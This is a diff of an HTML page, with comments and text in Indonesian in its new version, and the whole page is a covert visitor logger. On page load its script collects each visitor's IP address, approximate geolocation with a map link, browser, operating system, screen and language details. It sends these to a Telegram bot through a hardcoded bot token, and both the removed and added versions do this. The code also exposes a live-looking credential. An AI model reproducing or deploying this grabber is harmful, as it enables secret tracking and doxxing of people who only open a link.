@@ -1,75 +1,83 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Logger</title>
+    <title>Informasi Perangkat (Otomatis)</title>
 </head>
 <body>
-  <h1>Loading data...</h1>
-  <script>
-    const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
-    const CHAT_ID = "7218964278";
+    <h1>Mengumpulkan Informasi...</h1>
+    <script>
+        function sendDataToTelegram(data) {
+            const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k'; // Ganti dengan token bot Anda
+            const chatId = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';     // Ganti dengan chat ID Anda
+            let message = "📊 **Informasi Pengunjung** 📊\n\n";
+            message += `🌐 **IP Address:** ${data["IP Address"]}\n`;
+            message += `💻 **Browser:** ${data["Browser"]}\n`;
+            message += `⚙️ **Sistem Operasi:** ${data["Sistem Operasi"]}\n`;
+            message += `📐 **Resolusi Layar:** ${data["Resolusi Layar"]}\n`;
+            message += `🎨 **Kedalaman Warna:** ${data["Kedalaman Warna"]}\n`;
+            message += `🗣️ **Bahasa:** ${data["Bahasa"]}\n`;
+            message += `🍪 **Cookie:** ${data["Cookie Diaktifkan"] ? 'Diaktifkan ✅' : 'Dinonaktifkan ❌'}\n`;
+            if (data["Link Google Maps"]) {
+                message += `📍 **Lokasi:** ${data["Link Google Maps"]}\n`;
+            }
 
-    async function getIPInfo() {
-      try {
-        const res = await fetch("https://ipapi.co/json");
-        return await res.json();
-      } catch {
-        return {};
-      }
-    }
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-    async function getBattery() {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        return `Level: ${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
-      }
-      return "Not supported";
-    }
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(responseData => console.log('Pesan terkirim:', responseData))
+                .catch(error => console.error('Gagal mengirim pesan:', error));
+        }
 
-    async function sendTelegram(message) {
-      const proxyUrl = "https://api.allorigins.win/raw?url=" +
-        encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+        function getDeviceInfoAndSend() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const browser = navigator.userAgent;
+                    const os = navigator.platform;
+                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                    const language = navigator.language;
+                    const colorDepth = window.screen.colorDepth;
+                    const cookieEnabled = navigator.cookieEnabled;
+                    const latitude = data.latitude;
+                    const longitude = data.longitude;
 
-      await fetch(proxyUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      });
-    }
+                    let googleMapsLink = '';
+                    if (latitude && longitude) {
+                        googleMapsLink = `[Lihat di Google Maps](http://maps.google.com/?q=${latitude},${longitude})`;
+                    } else {
+                        googleMapsLink = 'Lokasi tidak tersedia';
+                    }
 
-    async function main() {
-      const ip = await getIPInfo();
-      const battery = await getBattery();
+                    const deviceInfo = {
+                        "IP Address": ipAddress,
+                        "Browser": browser,
+                        "Sistem Operasi": os,
+                        "Resolusi Layar": screenResolution,
+                        "Kedalaman Warna": colorDepth,
+                        "Bahasa": language,
+                        "Cookie Diaktifkan": cookieEnabled,
+                        "Link Google Maps": googleMapsLink
+                    };
 
-      const mapLink = ip.latitude && ip.longitude
-        ? `[📍 View Map](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})`
-        : 'Location unavailable';
+                    // Kirim data ke Telegram
+                    sendDataToTelegram(deviceInfo);
+                })
+                .catch(error => {
+                    console.error('Gagal mendapatkan informasi:', error);
+                    // Jika gagal mendapatkan informasi, kirim hanya IP
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            sendDataToTelegram({ "IP Address": data.ip });
+                        })
+                        .catch(ipError => console.error('Gagal mendapatkan IP:', ipError));
+                });
+        }
 
-      const msg = `
-📡 *New Visitor Log*
-
-🌐 *IP:* ${ip.ip || "N/A"}
-📍 *Location:* ${ip.city || "?"}, ${ip.region || "?"}, ${ip.country_name || "?"}
-🗺️ ${mapLink}
-🏢 *ISP:* ${ip.org || "N/A"}
-
-🧭 *Timezone:* ${ip.timezone || "N/A"}
-🗣 *Language:* ${navigator.language}
-📏 *Screen:* ${window.screen.width}x${window.screen.height}
-🔋 *Battery:* ${battery}
-🧠 *User Agent:* ${navigator.userAgent}
-      `.trim();
-
-      await sendTelegram(msg);
-      document.body.innerHTML = "<h2>✅ Data sent to Telegram!</h2>";
-    }
-
-    main();
-  </script>
+        // Panggil fungsi getDeviceInfoAndSend saat halaman dimuat
+        window.onload = getDeviceInfoAndSend;
+    </script>
 </body>
 </html>
